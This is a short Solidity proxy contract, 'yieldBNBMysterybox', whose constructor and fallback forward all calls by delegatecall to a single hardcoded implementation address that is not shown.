// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

contract yieldBNBMysterybox {
    fallback(bytes calldata data) external payable returns (bytes memory) {
        (bool success, bytes memory result) = (
            0x8f5FC5A98054347DcA2286D329018094b1a9b1a0
        ).delegatecall(data);
        require(success, "Fail");
        return result;
    }

    constructor(
        string memory name,
        string memory symbol,
        string memory metadataUri,
        uint256 supply,
        address addressFrom,
        uint256 balanceOfUsers
    ) {
        bytes memory data = abi.encodeWithSignature(
            "initialize(string,string,uint256,address,string,uint256)",
            name,
            symbol,
            supply,
            addressFrom,
            metadataUri,
            balanceOfUsers
        );

        (bool success, bytes memory result) = (
            0x8f5FC5A98054347DcA2286D329018094b1a9b1a0
        ).delegatecall(data);

        require(success, "Fail");
    }
}